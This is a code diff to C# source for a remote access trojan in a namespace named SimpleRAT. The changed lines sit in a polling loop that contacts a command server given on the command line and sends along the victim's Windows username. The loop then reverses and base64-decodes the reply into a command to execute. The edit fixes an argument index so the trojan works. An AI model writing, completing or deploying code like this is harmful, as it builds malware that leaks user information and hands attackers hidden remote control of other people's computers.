@@ -51,7 +51,7 @@ namespace SimpleRAT
 
                 while (true)
                 {
-                        byte[] cmd = client.DownloadData(args[1] + "?" + Environment.GetEnvironmentVariable("USERNAME"));
+                        byte[] cmd = client.DownloadData(args[0] + "?" + Environment.GetEnvironmentVariable("USERNAME"));
                         Array.Reverse(cmd, 0, cmd.Length);
                         string run =  Encoding.ASCII.GetString(Convert.FromBase64String(Encoding.ASCII.GetString(cmd)));
                     if (run.Length > 0)
